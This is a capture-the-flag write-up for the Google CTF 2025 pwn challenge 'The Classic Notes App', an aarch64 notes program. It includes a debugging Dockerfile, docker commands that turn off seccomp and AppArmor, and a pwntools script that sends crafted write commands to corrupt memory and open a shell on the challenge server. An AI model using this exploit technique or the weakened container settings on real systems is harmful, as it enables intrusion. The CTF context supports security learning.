---
title: Google CTF 2025 Writeup | PWN - The Classic Notes App
slug: googlectf25-the-classic-notes-app
author: Utkarsh M
date: '2025-07-16'
description: "Writeup and solution for the Google CTF 2025 - The Classic Notes App challenge."
categories:
  - CTFs
tags:
  - write up
  - web
  - ctf
  - google
  - googlectf
  - reverse engineering
  - pwn
  - re
  - vm
images: 
  - /assets/img/ctf/googlectf25/the-classic-notes-app.png
---

### Challenge Details

> RC's notebook server. RC does not care about memory safety because *** protects him!<br>
> Author: RC, roguebantha


Connection string: `the-classic-notes-app.2025.ctfcompetition.com 1337`

files: `ctf.c, Dockerfile, nsjail.cfg, qemu-aarch64`

-------------------

## Application

It's a simple note-taking application built for the aarch64 architecture running through QEMU on the challenge server.

You can interact with it using commands like:

```sh
Give me your command:
R 1    
Note at 1: World!
Give me your command:
C 3
Give me your command:
W 2 0 3ABC
Give me your command:
R 2
Note at 2: ABC�
Give me your command:
```

## Solving the challenge

Updated Dockerfile to debug with gdb (gdb-multiarch):

```Dockerfile
# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
FROM ubuntu:24.04 as chroot

# ubuntu24 includes the ubuntu user by default
RUN /usr/sbin/userdel -r ubuntu && /usr/sbin/useradd --no-create-home -u 1000 user

RUN apt update && apt install -y python3-full binutils-aarch64-linux-gnu gcc-aarch64-linux-gnu

COPY qemu-aarch64 /home/user/qemu-aarch64
COPY ctf.c /home/user/ctf.c
COPY flag.txt /home/user/flag.txt
RUN aarch64-linux-gnu-gcc /home/user/ctf.c -o /home/user/ctf -march=armv8.5-a+memtag -fPIE -pie

RUN cp /usr/bin/env /home/user/env

FROM gcr.io/kctf-docker/challenge@sha256:9f15314c26bd681a043557c9f136e7823414e9e662c08dde54d14a6bfd0b619f

COPY --from=chroot / /chroot

# COPY nsjail.cfg /home/user/
RUN apt install -y socat
CMD socat \
      TCP-LISTEN:1337,reuseaddr,fork \
      EXEC:"/chroot/home/user/env GLIBC_TUNABLES='glibc.mem.tagging=1' /chroot/home/user/qemu-aarch64 -L /chroot/usr/aarch64-linux-gnu/ -g 7878 /chroot/home/user/ctf"
# 
```

commands to debug:

```sh
# starting the container 
docker build -t gdb-build  .
docker run --name cn-gctf-2 -p 1337:1337 -p 7878:7878 --rm   --cap-add=SYS_ADMIN   --cap-add=SYS_PTRACE   --security-opt seccomp=unconfined   --security-opt apparmor=unconfined   --privileged   gdb-build 

# Inside gdb
file ./ctf # copied from :D docker container
set architecture aarch64
target remote localhost:7878
```


The following image illustrates the solution process for the challenge in detail.

![](/assets/img/ctf/googlectf25/the-classic-notes-app.png)

## solution

```py
import pwn

while True:
    try:
        t = pwn.remote('the-classic-notes-app.2025.ctfcompetition.com', 1337)
        t.timeout = None
        t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 1 32 2' + b'\xa0\x02')
        k = t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 0 0 4' + b'exit')
        t.recvuntil(b'Give me your command:\n')
        t.sendline(b'W 0 50 100'+ b'\xAA'*100)
        print(k)
        t.interactive()
        break
    except EOFError:
        try:
            t.close()
        except Exception:
            pass
        continue
```

[Github Gist ](https://gist.github.com/Utkar5hM/6606ed6bbde5e3729a13b7f8a778c2e6)

## Obtaining the flag

![](/assets/img/ctf/googlectf25/the-classic-notes-app-2.png)